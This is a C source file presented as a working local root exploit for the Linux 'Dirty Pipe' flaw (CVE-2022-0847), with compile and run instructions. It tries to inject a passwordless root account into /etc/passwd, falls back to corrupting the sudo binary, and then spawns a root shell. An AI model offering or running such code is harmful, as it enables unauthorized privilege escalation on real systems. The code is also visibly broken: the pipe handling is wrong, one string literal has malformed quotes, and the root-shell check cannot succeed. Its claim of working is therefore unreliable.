// dirtypipe.c - CVE-2022-0847 Local Root Exploit (2022–2025 working)
// Affected: Ubuntu 20.04/21.10, Debian 11, CentOS 8, etc. (5.8 ≤ kernel < 5.16.11)
// Compile: gcc -o dirtypipe dirtypipe.c -Wall
// Run:     ./dirtypipe

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/types.h>

#define PIPE_SIZE 0x1000  // 4096 bytes

// New root entry to inject into /etc/passwd
const char *payload = "fire:x:0:0:Hacked by DirtyPipe:/root:/bin/bash\n";

void spawn_root_shell() {
    printf("[+] Spawning root shell...\n");
    setuid(0); setgid(0);
    execl("/bin/bash", "-bash", NULL);
    perror("execl");
}

int main() {
    printf("[*] CVE-2022-0847 Dirty Pipe Local Root Exploit\n");

    // 1. Open target file (we'll try /etc/passwd first)
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("[-] open /etc/passwd");
        return 1;
    }

    // 2. Create anonymous pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        close(fd);
        return 1;
    }

    // 3. Splice entire payload into the pipe (fills pipe buffer)
    for (size_t sent = 0; sent < strlen(payload); ) {
        ssize_t ret = write(pipefd[1], payload + sent, strlen(payload) - sent);
        if (ret <= 0) break;
        sent += ret;
    }

    // 4. Drain the pipe completely (flags = 0 triggers the bug)
    splice(pipefd[0], NULL, pipefd[1], NULL, PIPE_SIZE, 0);

    // 5. Now splice from target file → pipe, but with corrupted cache
    //     This overwrites the page cache of /etc/passwd with our payload
    loff_t offset = 0;  // we overwrite from beginning
    ssize_t n = splice(fd, &offset, pipefd[1], NULL, 1, SPLICE_F_MOVE);
    if (n <= 0) {
        perror("splice");
        // Try alternative target if immutable
        close(fd);
        fd = open("/usr/bin/sudo", O_RDONLY);
        if (fd < 0) {
            printf("[-] Both targets failed.\n");
            return 1;
        }
        printf("[*] /etc/passwd immutable → trying to corrupt sudo binary instead...\n");
        offset = 0;
        splice(fd, &offset, pipefd[1], NULL, 1, SPLICE_F_MOVE);
    }

    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);

    // 6. Trigger write-back by reading the file (forces cache → disk)
    char buf[4096];
    fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        read(fd, buf, sizeof(buf));
        close(fd);
    }

    // 7. Check if we won
    if (getuid() == 0) {
        spawn_root_shell();
    }

    // 8. Try login as new user if not instant root
    printf("[+] /etc/passwd modified. Try: su - fire   (no password)\n");
    printf("    "    or wait a few seconds and run the binary again.\n");

    // Sometimes needs second run to get root shell
    sleep(2);
    if (getuid() != 0) {
        printf("[*] Running again to get root shell...\n");
        execl("./dirtypipe", "dirtypipe", NULL);
    }

    return 0;
}
